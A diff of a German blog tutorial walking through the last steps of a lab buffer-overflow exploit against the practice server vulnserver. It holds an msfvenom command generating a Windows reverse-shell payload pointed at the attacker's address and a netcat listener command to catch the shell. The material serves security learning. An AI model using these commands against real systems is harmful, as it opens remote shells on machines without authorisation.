@@ -137,13 +137,22 @@ Nun klicken wir im Immunity Debugger in der oberen Symbolleiste auf den blauen P
 
 Wir generieren den Shellcode mit msfvenom.
 
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.45 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+```
 
 Wir legen fest, dass eine Reverse Shell als Payload generiert werden soll. Als LHOST geben wir die IP-Adresse unseres Kali Linux an und wählen als Port 4444. Die EXITFUNC=thread soll den Payload stabilisieren. -f gibt den Dateitypen an, in diesem Fall C. -a ist die Architektur, also hier x86. Mit -b schließen wir die Bad Characters aus, hier nur das Nullbyte, weil wir sonst keine Bad Characters gefunden haben.
 
+![Erstellung des Shellcodes mit msfvenom]({{site.baseurl}}/images/buffer-16.png)
+
+Den Shellcode in Hex kopieren wir und fügen ihm unseren Python-Skript hinzu.
 Im Video von The Cyber Mentor wurde darauf hingewiesen, dass das Skript an dieser Stelle mit der Funktion encode nicht funktioniert. Stattdessen muss man alle Daten manuell in ein Byteformat umwandeln. Dies macht man, indem man einfach ein b voranstellt, wie auf dem Screenshot zu erkennen ist.
 
+![Screenshot des Python-Skripts mit manueller Umwandlung in Bytecode]({{site.baseurl}}/images/buffer-17.png)
+
 In Kali Linux öffnen wir eine Netcat-Listener mit nc -lvnp 4444. Wenn wir nun das Python-Skript mit dem Reverse-Shell Payload ausführen, sollte vulnserver eine Verbindung zu unserem Listener aufbauen. Damit haben wir eine Shell auf der Windows-Maschine und somit unser Ziel erreicht.
+
+![Screenshot der erfolgreichen Herstellung der Reverse Shell mit netcat]({{site.baseurl}}/images/buffer-18.png)
 
 
 
